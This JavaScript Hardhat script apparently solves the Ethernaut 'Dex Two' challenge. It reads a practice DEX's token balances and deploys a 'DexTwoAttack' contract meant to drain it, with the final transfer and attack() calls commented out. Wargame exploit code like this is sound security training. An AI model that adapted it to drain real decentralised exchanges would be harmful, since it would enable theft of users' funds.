const { dexTwo: dexInstanceConstant } = require('../instanceAddresses.json');
const {
  abi: dexAbi,
} = require('../artifacts/contracts/DexTwo.sol/DexTwo.json');
const {
  abi: tokenAbi,
} = require('../artifacts/contracts/DexTwo.sol/SwappableTokenTwo.json');
const {
  abi: dexAttackAbi,
} = require('../artifacts/contracts/DexTwo.sol/DexTwoAttack.json');
const { verify } = require('../utils/verify');
const { resetDexTwo } = require('../reset/resetDexTwo');

const getDexBalance = async (dex, token1Contract, token2Contract) => {
  const token1Balance = await token1Contract.balanceOf(dex);
  const token2Balance = await token2Contract.balanceOf(dex);
  console.log('token1Balance:', token1Balance.toString());
  console.log('token2Balance:', token2Balance.toString());
  return { token1Balance, token2Balance };
};

const isResetDexTwo = false;

const dexTwoAttack = async () => {
  console.log('Hacking Dex Two...');
  let dexInstance;
  // Reset dex (if needed)
  if (isResetDexTwo) {
    dexInstance = await resetDexTwo();
  } else {
    dexInstance = dexInstanceConstant;
  }
  console.log(dexInstance);
  const dex = await ethers.getContractAt(dexAbi, dexInstance);
  // Get token1
  const token1 = await dex.token1();
  // Get token2
  const token2 = await dex.token2();
  console.log('token1:', token1);
  console.log('token2:', token2);
  // Get token1 contract
  const token1Contract = await ethers.getContractAt(tokenAbi, token1);
  // Get token2 contract
  const token2Contract = await ethers.getContractAt(tokenAbi, token2);
  // Get dex balance
  let { token1Balance, token2Balane } = await getDexBalance(
    dexInstance,
    token1Contract,
    token2Contract
  );

  // Deploy attack contract
  const dexAttackArgs = [dexInstance, token1, token2];
  const DexAttack = await ethers.getContractFactory('DexTwoAttack');
  const dexAttack = await DexAttack.deploy(...dexAttackArgs);
  await dexAttack.deployed();
  console.log('dexAttack deployed to:', dexAttack.address);
  //   await verify(dexAttack.address, dexAttackArgs);

  // Transfer our 10 wei tokens to attack contract
  //   const txn1 = await token1Contract.transfer(dexAttack.address, '10');
  //   await txn1.wait();
  //   const txn2 = await token2Contract.transfer(dexAttack.address, '10');
  //   await txn2.wait();
  //   console.log('Tokens transferred to attack contract.');

  // Got him now
  //   await dexAttack.attack();
};

dexTwoAttack().catch((error) => {
  console.error(error);
  process.exit(1);
});
